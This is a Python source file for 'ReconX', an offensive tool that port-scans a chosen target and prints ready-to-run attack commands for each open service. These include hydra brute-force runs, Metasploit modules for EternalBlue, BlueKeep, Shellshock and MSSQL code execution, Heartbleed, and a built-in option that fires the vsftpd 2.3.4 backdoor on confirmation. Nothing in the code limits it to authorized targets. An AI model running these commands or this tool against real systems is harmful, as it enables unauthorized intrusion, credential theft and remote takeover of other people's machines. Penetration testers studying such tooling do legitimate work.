#!/usr/bin/env python3
"""
ReconX - by Seyed
"""

import subprocess, sys, socket, datetime, json, os, argparse, time, threading
import xml.etree.ElementTree as ET
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
from rich.live import Live
from rich.text import Text
from rich import box

console = Console()

BANNER = """[bold red]
  ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗ ██╗  ██╗
  ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║ ╚██╗██╔╝
  ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║  ╚███╔╝ 
  ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║  ██╔██╗ 
  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║ ██╔╝ ██╗
  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
[/bold red][bold yellow]
  ReconX  by Seyed                github.com/seyedebrahimhashemi
[/bold yellow]"""

# Top 15 most vulnerable / targeted ports
TARGET_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 8080, 8443]

EXPLOITS = {
    21: {
        "label": "FTP",
        "risk": "HIGH",
        "exploits": [
            {
                "name": "vsftpd 2.3.4 Backdoor",
                "cve": "CVE-2011-2523",
                "check": "nmap -p 21 --script ftp-vsftpd-backdoor {ip}",
                "action": "vsftpd_backdoor",
                "description": "Sends USER x:) to trigger backdoor shell on port 6200"
            },
            {
                "name": "FTP Anonymous Login",
                "cve": "N/A",
                "check": "nmap -p 21 --script ftp-anon {ip}",
                "action": "ftp {ip}   # user: anonymous   pass: anything",
                "description": "Log in without credentials and browse files"
            }
        ]
    },
    22: {
        "label": "SSH",
        "risk": "MEDIUM",
        "exploits": [
            {
                "name": "SSH Brute Force",
                "cve": "N/A",
                "check": "nmap -p 22 --script ssh-auth-methods {ip}",
                "action": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4",
                "description": "Dictionary attack against SSH login"
            },
            {
                "name": "SSH User Enumeration",
                "cve": "CVE-2018-15473",
                "check": "nmap -p 22 --script ssh-auth-methods {ip}",
                "action": "python3 ssh_user_enum.py --userList /usr/share/wordlists/metasploit/unix_users.txt {ip}",
                "description": "Enumerate valid usernames via timing difference"
            }
        ]
    },
    23: {
        "label": "Telnet",
        "risk": "CRITICAL",
        "exploits": [
            {
                "name": "Telnet Brute Force",
                "cve": "N/A",
                "check": "nmap -p 23 --script telnet-ntlm-info {ip}",
                "action": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt telnet://{ip}",
                "description": "Plaintext protocol; brute force login credentials"
            }
        ]
    },
    25: {
        "label": "SMTP",
        "risk": "MEDIUM",
        "exploits": [
            {
                "name": "SMTP User Enumeration",
                "cve": "N/A",
                "check": "nmap -p 25 --script smtp-enum-users {ip}",
                "action": "smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {ip}",
                "description": "Use VRFY/EXPN commands to enumerate valid users"
            },
            {
                "name": "SMTP Open Relay",
                "cve": "N/A",
                "check": "nmap -p 25 --script smtp-open-relay {ip}",
                "action": "swaks --to victim@target.com --from fake@attacker.com --server {ip}",
                "description": "Test if server relays mail for unauthorized senders"
            }
        ]
    },
    53: {
        "label": "DNS",
        "risk": "HIGH",
        "exploits": [
            {
                "name": "DNS Zone Transfer",
                "cve": "N/A",
                "check": "nmap -p 53 --script dns-zone-transfer {ip}",
                "action": "dig axfr @{ip} target.com",
                "description": "Dump entire DNS zone to expose internal hostnames and IPs"
            }
        ]
    },
    80: {
        "label": "HTTP",
        "risk": "HIGH",
        "exploits": [
            {
                "name": "Shellshock",
                "cve": "CVE-2014-6271",
                "check": "nmap -p 80 --script http-shellshock {ip}",
                "action": "msfconsole -q -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS {ip}; set TARGETURI /cgi-bin/test.cgi; run'",
                "description": "Inject commands via malformed HTTP headers into bash CGI"
            },
            {
                "name": "Directory Enumeration",
                "cve": "N/A",
                "check": "nmap -p 80 --script http-enum {ip}",
                "action": "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt",
                "description": "Brute force hidden paths and files on the web server"
            },
            {
                "name": "Nikto Web Scan",
                "cve": "N/A",
                "check": "nikto -h http://{ip}",
                "action": "nikto -h http://{ip} -o nikto_report.txt",
                "description": "Scan for misconfigurations, outdated software, and common vulnerabilities"
            }
        ]
    },
    110: {
        "label": "POP3",
        "risk": "MEDIUM",
        "exploits": [
            {
                "name": "POP3 Brute Force",
                "cve": "N/A",
                "check": "nmap -p 110 --script pop3-capabilities {ip}",
                "action": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt pop3://{ip}",
                "description": "Brute force email account credentials over POP3"
            }
        ]
    },
    139: {
        "label": "NetBIOS",
        "risk": "HIGH",
        "exploits": [
            {
                "name": "NetBIOS Enumeration",
                "cve": "N/A",
                "check": "nmap -p 139 --script nbstat {ip}",
                "action": "enum4linux -a {ip}",
                "description": "Enumerate shares, users, groups, and policies via SMB/NetBIOS"
            }
        ]
    },
    443: {
        "label": "HTTPS",
        "risk": "MEDIUM",
        "exploits": [
            {
                "name": "SSL/TLS Weakness Scan",
                "cve": "N/A",
                "check": "nmap -p 443 --script ssl-enum-ciphers {ip}",
                "action": "sslscan {ip}:443 && testssl.sh {ip}",
                "description": "Detect weak ciphers, expired certs, and POODLE/BEAST/DROWN"
            },
            {
                "name": "Heartbleed",
                "cve": "CVE-2014-0160",
                "check": "nmap -p 443 --script ssl-heartbleed {ip}",
                "action": "python3 heartbleed.py {ip}",
                "description": "Leak up to 64KB of server memory including private keys"
            }
        ]
    },
    445: {
        "label": "SMB",
        "risk": "CRITICAL",
        "exploits": [
            {
                "name": "EternalBlue (MS17-010)",
                "cve": "CVE-2017-0144",
                "check": "nmap -p 445 --script smb-vuln-ms17-010 {ip}",
                "action": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; set LHOST YOUR_IP; run'",
                "description": "Remote code execution via Windows SMB buffer overflow; used in WannaCry"
            },
            {
                "name": "SMB Share Enumeration",
                "cve": "N/A",
                "check": "nmap -p 445 --script smb-enum-shares {ip}",
                "action": "smbclient -L //{ip} -N && smbmap -H {ip}",
                "description": "List accessible shares without authentication"
            }
        ]
    },
    1433: {
        "label": "MSSQL",
        "risk": "CRITICAL",
        "exploits": [
            {
                "name": "MSSQL Brute Force",
                "cve": "N/A",
                "check": "nmap -p 1433 --script ms-sql-info {ip}",
                "action": "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{ip}",
                "description": "Brute force the SA account; if successful, xp_cmdshell gives OS access"
            },
            {
                "name": "MSSQL xp_cmdshell RCE",
                "cve": "N/A",
                "check": "nmap -p 1433 --script ms-sql-empty-password {ip}",
                "action": "msfconsole -q -x 'use exploit/windows/mssql/mssql_payload; set RHOSTS {ip}; set USERNAME sa; run'",
                "description": "Execute OS commands directly through MSSQL if SA account is compromised"
            }
        ]
    },
    3306: {
        "label": "MySQL",
        "risk": "HIGH",
        "exploits": [
            {
                "name": "MySQL Anonymous Login",
                "cve": "N/A",
                "check": "nmap -p 3306 --script mysql-empty-password {ip}",
                "action": "mysql -h {ip} -u root --password=",
                "description": "Connect to MySQL as root with no password"
            },
            {
                "name": "MySQL Brute Force",
                "cve": "N/A",
                "check": "nmap -p 3306 --script mysql-info {ip}",
                "action": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{ip}",
                "description": "Brute force MySQL root credentials"
            }
        ]
    },
    3389: {
        "label": "RDP",
        "risk": "CRITICAL",
        "exploits": [
            {
                "name": "BlueKeep",
                "cve": "CVE-2019-0708",
                "check": "nmap -p 3389 --script rdp-vuln-ms12-020 {ip}",
                "action": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {ip}; run'",
                "description": "Pre-auth RCE on unpatched Windows 7 and Server 2008 via RDP"
            },
            {
                "name": "RDP Brute Force",
                "cve": "N/A",
                "check": "nmap -p 3389 --script rdp-enum-encryption {ip}",
                "action": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt rdp://{ip} -t 4",
                "description": "Brute force Windows login credentials over RDP"
            }
        ]
    },
    8080: {
        "label": "HTTP-Alt",
        "risk": "MEDIUM",
        "exploits": [
            {
                "name": "HTTP-Alt Directory Enum",
                "cve": "N/A",
                "check": "nmap -p 8080 --script http-enum {ip}",
                "action": "gobuster dir -u http://{ip}:8080 -w /usr/share/wordlists/dirb/common.txt",
                "description": "Enumerate hidden paths on alternate HTTP port (Tomcat, Jenkins, etc.)"
            },
            {
                "name": "Tomcat Manager Brute Force",
                "cve": "N/A",
                "check": "nmap -p 8080 --script http-tomcat-manager {ip}",
                "action": "msfconsole -q -x 'use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS {ip}; run'",
                "description": "Brute force Tomcat manager login to upload malicious WAR file"
            }
        ]
    },
    8443: {
        "label": "HTTPS-Alt",
        "risk": "MEDIUM",
        "exploits": [
            {
                "name": "HTTPS-Alt SSL Scan",
                "cve": "N/A",
                "check": "nmap -p 8443 --script ssl-enum-ciphers {ip}",
                "action": "sslscan {ip}:8443 && nikto -h https://{ip}:8443",
                "description": "Check for weak TLS configs and web vulnerabilities on alternate HTTPS port"
            }
        ]
    }
}

RISK_COLOR = {
    "CRITICAL": "bold red",
    "HIGH":     "bold yellow",
    "MEDIUM":   "cyan",
    "LOW":      "green"
}

def parse_args():
    p = argparse.ArgumentParser(
        description="ReconX by Seyed - Automated recon and exploit suggestion tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    p.add_argument("target", nargs="?", help="Target IP or domain")
    p.add_argument("--stealth", action="store_true", help="Stealth scan: slower, lower noise (-sS -T2)")
    return p.parse_args()

def section(title):
    console.print()
    console.print(Panel(f"[bold yellow]{title}[/bold yellow]", expand=False, border_style="red"))

def scan_ports_live(ip, ports, stealth):
    """Single nmap call for all ports with a clean Rich Live spinner."""
    open_ports = []
    flags = ["-sS", "-T4", "--open"]
    port_str = ",".join(str(p) for p in ports)
    cmd = ["nmap"] + flags + ["-p", port_str, ip, "-oX", "/tmp/recon_all.xml"]

    start = time.time()
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    frames = ["|", "/", "-", "\\"]
    i = 0
    with Live(console=console, refresh_per_second=8) as live:
        while proc.poll() is None:
            elapsed = int(time.time() - start)
            frame = frames[i % len(frames)]
            live.update(
                Text(f"  {frame}  Scanning {len(ports)} ports on {ip} ... {elapsed}s",
                     style="bold red")
            )
            i += 1
            time.sleep(0.12)
        live.update(Text("  Done.", style="bold green"))

    try:
        tree = ET.parse("/tmp/recon_all.xml")
        root = tree.getroot()
        for p in root.findall(".//port"):
            state = p.find("state")
            if state is not None and state.attrib.get("state") == "open":
                pid = int(p.attrib["portid"])
                svc = p.find("service")
                name    = svc.attrib.get("name", "unknown") if svc is not None else "unknown"
                version = svc.attrib.get("version", "")      if svc is not None else ""
                open_ports.append({"port": pid, "name": name, "version": version})
                console.print(f"  [bold green][+][/bold green] Port [bold green]{pid}[/bold green] OPEN   {name} {version}".strip())
    except Exception as e:
        console.print(f"  [red][!] XML parse error: {e}[/red]")

    return open_ports

def detect_os(ip):
    """Fast OS guess from TTL value via ping."""
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True)
        output = result.stdout
        for line in output.splitlines():
            if "ttl=" in line.lower():
                ttl = int(line.lower().split("ttl=")[1].split()[0])
                if ttl >= 128:
                    return f"Windows (TTL={ttl})"
                elif ttl >= 64:
                    return f"Linux/Unix (TTL={ttl})"
                else:
                    return f"Network device (TTL={ttl})"
    except Exception:
        pass
    return "Unknown"

def banner_grab(ip, ports):
    results = {}
    lock = threading.Lock()

    def grab(p):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((ip, p))
            banner = s.recv(1024).decode(errors="ignore").strip()[:100]
            s.close()
            val = banner if banner else "[no banner]"
        except socket.timeout:
            val = "[timeout]"
        except ConnectionRefusedError:
            val = "[connection refused]"
        except Exception as e:
            val = f"[{type(e).__name__}]"
        with lock:
            results[p] = val

    threads = [threading.Thread(target=grab, args=(p,)) for p in ports]
    for t in threads: t.start()
    for t in threads: t.join()
    return results

def show_exploits(open_ports, ip):
    port_nums = [p["port"] for p in open_ports]
    exploit_log = []

    for port in port_nums:
        if port not in EXPLOITS:
            continue
        meta = EXPLOITS[port]
        risk_style = RISK_COLOR.get(meta["risk"], "white")

        console.print()
        console.print(Panel(
            f"[{risk_style}]PORT {port} / {meta['label']}   RISK: {meta['risk']}[/{risk_style}]",
            border_style=risk_style.replace("bold ", ""),
            expand=False
        ))

        for ex in meta["exploits"]:
            if ex["action"] == "vsftpd_backdoor":
                action_str = f"python3 -c 'import socket; s=socket.socket(); s.connect((\"{ip}\", 21)); s.send(b\"USER x:\\r\\n\")'"
            else:
                user = ""
                if port in [22, 23, 25, 110, 3389, 1433]:
                    user = input(f"  [?] Enter username for {ex['name']} (blank to skip): ").strip()
                action_str = ex["action"].format(ip=ip, user=user)

            console.print(f"  [bold white]{ex['name']}[/bold white]  [dim]{ex.get('cve', 'N/A')}[/dim]")
            console.print(f"  [dim]{ex['description']}[/dim]")
            console.print(f"  [cyan]CHECK :[/cyan]  {ex['check'].format(ip=ip)}")
            console.print(f"  [yellow]ATTACK:[/yellow]  {action_str}")
            console.rule(style="dim")

            if ex["action"] == "vsftpd_backdoor":
                if input("  [?] Trigger vsftpd backdoor now? (y/n): ").lower() == 'y':
                    os.system(action_str)
                    console.print("  [yellow][*] Payload sent. Check port 6200.[/yellow]")

            exploit_log.append({
                "port": port,
                "service": meta["label"],
                "risk": meta["risk"],
                "name": ex["name"],
                "cve": ex.get("cve", "N/A"),
                "check": ex["check"].format(ip=ip),
                "attack": action_str
            })

    return exploit_log

def main():
    args = parse_args()
    console.print(BANNER)

    target = args.target or console.input("[bold green]Target IP or Domain: [/bold green]").strip()

    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror:
        console.print("[bold red][!] Could not resolve host.[/bold red]")
        sys.exit(1)

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    report_txt  = f"recon_{ip}_{ts}.txt"
    report_json = f"recon_{ip}_{ts}.json"

    json_data = {
        "target": target,
        "ip": ip,
        "timestamp": ts,
        "stealth": args.stealth,
        "os": "",
        "open_ports": [],
        "banners": {},
        "exploits": []
    }

    # PHASE 1
    section("[1] HOST CHECK")
    console.print(f"  [bold green][+] {ip} is reachable[/bold green]")

    # PHASE 2: Live port scan
    section("[2] PORT SCAN   (Top 15 most targeted ports)")
    if args.stealth:
        console.print("  [yellow][*] Stealth mode active: -sS -T2[/yellow]")
    open_ports = scan_ports_live(ip, TARGET_PORTS, args.stealth)
    json_data["open_ports"] = open_ports

    if not open_ports:
        console.print("  [red][!] No open ports found.[/red]")

    # PHASE 3: OS detection
    section("[3] OS DETECTION")
    with console.status("[yellow]Detecting OS...[/yellow]"):
        os_guess = detect_os(ip)
    console.print(f"  [bold cyan][+] OS guess: {os_guess}[/bold cyan]")
    json_data["os"] = os_guess

    # PHASE 4: Exploit chain
    section("[4] EXPLOIT CHAIN")
    exploit_log = show_exploits(open_ports, ip)
    json_data["exploits"] = exploit_log

    # PHASE 5: Banner grab
    section("[5] BANNER GRAB")
    port_nums = [p["port"] for p in open_ports]
    banners = banner_grab(ip, port_nums)
    json_data["banners"] = {str(k): v for k, v in banners.items()}

    banner_table = Table(title="Service Banners", box=box.SIMPLE_HEAVY, border_style="cyan")
    banner_table.add_column("Port",    style="green",  width=8)
    banner_table.add_column("Banner",  style="white")
    for port, banner in banners.items():
        banner_table.add_row(str(port), banner)
    console.print(banner_table)

    # SUMMARY
    section("SUMMARY")
    summary_table = Table(box=box.ROUNDED, border_style="green", show_header=False)
    summary_table.add_column("Field", style="bold white", width=16)
    summary_table.add_column("Value", style="cyan")
    summary_table.add_row("Target",       target)
    summary_table.add_row("IP",           ip)
    summary_table.add_row("OS",           os_guess)
    summary_table.add_row("Open ports",   str(len(open_ports)))
    summary_table.add_row("Ports found",  ", ".join(str(p["port"]) for p in open_ports) or "None")
    summary_table.add_row("Exploits",     str(len(exploit_log)))
    summary_table.add_row("Stealth",      str(args.stealth))
    summary_table.add_row("Report TXT",   report_txt)
    summary_table.add_row("Report JSON",  report_json)
    console.print(summary_table)

    # Save reports
    txt_lines = [
        f"TARGET    : {target}",
        f"IP        : {ip}",
        f"DATE      : {ts}",
        f"OS        : {os_guess}",
        f"PORTS     : {[p['port'] for p in open_ports]}",
        "",
        "EXPLOIT CHAIN:",
    ]
    for ex in exploit_log:
        txt_lines.append(f"  [{ex['risk']}] {ex['name']} ({ex['cve']}) on port {ex['port']}")
        txt_lines.append(f"    CHECK : {ex['check']}")
        txt_lines.append(f"    ATTACK: {ex['attack']}")
        txt_lines.append("")

    with open(report_txt, "w") as f:
        f.write("\n".join(txt_lines))
    with open(report_json, "w") as f:
        json.dump(json_data, f, indent=2)

    console.print(f"\n[bold green][+] Reports saved: {report_txt}  |  {report_json}[/bold green]")

if __name__ == "__main__":
    main()
